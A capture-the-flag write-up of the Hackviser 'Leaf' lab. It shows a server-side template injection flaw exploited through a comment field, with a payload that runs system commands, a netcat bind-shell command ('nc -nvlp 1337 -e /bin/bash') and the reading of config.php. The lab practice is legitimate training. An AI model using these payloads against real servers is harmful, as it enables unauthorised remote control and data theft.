---
title: 'Leaf'
date: '2026-03-18'
excerpt: 'Practice discovering and exploiting the SSTI vulnerability and taking over the server with bind shell.'
prog: 'Hackviser Warmup Stage 2  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/warmups/leaf/leaf_hackviser_logo.png" alt="Leaf logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Leaf</h1>
<div class="writeup-date">March 2026 &middot; Warmup Stage 2</div>
</div>
</div>
<p class="lead mb-4">The Server-Side Template Injection (SSTI) vulnerability occurs when a web application does not sufficiently check user data in the template engine. This allows attackers to manipulate the template engine to execute unwanted commands on the server. Recommended for practicing discovering and exploiting the SSTI vulnerability and taking over the server with bind shell.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the website title?</p>
<p class="mb-3">We can open the target IP in a web browser and check the title of the page.</p>
<img src="/assets/hackinglabs/hackviser/warmups/leaf/leaf_hackviser_image1.png" alt="Leaf Image 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> Modish Tech</p>
<br />

<p class="mb-2"><strong>Question 2:</strong> Which GET parameter is used on the page where the product detail is displayed?</p>
<p class="mb-3">Click on a product to view its details and observe the URL in the browser's address bar.</p>
<img src="/assets/hackinglabs/hackviser/warmups/leaf/leaf_hackviser_image2.png" alt="Leaf Image 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> id</p>
<br />

<p class="mb-2"><strong>Question 3:</strong> What does SSTI stands for?</p>
<p class="mb-5"><strong>Answer:</strong> Server-Side Template Injection</p>
<br />

<p class="mb-2"><strong>Question 4:</strong> What is the commonly used SSTI payload that prints 49 on the screen?</p>
<p class="mb-5"><strong>Answer:</strong> {{7*7}}</p>
<br />

<p class="mb-2"><strong>Question 5:</strong> What is the name of the database used by the application?</p>
<p class="mb-3">For this task, we need to use SSTI in the comment fields to hack into the target machine. We will first try the payload <code>{7*7}</code> and observe its output.</p>
<img src="/assets/hackinglabs/hackviser/warmups/leaf/leaf_hackviser_image3.png" alt="Leaf Image 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Since the output is 49, we can confirm that the application is vulnerable to SSTI. We can then create a backdoor to execute commands on the server using the following payload: <code>{{['<command>']|filter('system')}}</code></p>
<p class="mb-3">When we use <code>{{['ls']|filter('system')}}</code>, we can see the list of files in the current directory.</p>
<img src="/assets/hackinglabs/hackviser/warmups/leaf/leaf_hackviser_image4.png" alt="Leaf Image 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">We will use the payload <code>{{['nc -nvlp 1337 -e /bin/bash']|filter('system')}}</code> to create a bind shell on the target machine, then use <code>nc -nv [target IP] 1337</code> to connect to it.</p>
<img src="/assets/hackinglabs/hackviser/warmups/leaf/leaf_hackviser_image5.png" alt="Leaf Image 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Now that we have a shell on the target machine, we can use the command <code>cat config.php</code> to read the database name.</p>
<p class="mb-5"><strong>Answer:</strong> modish_tech</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>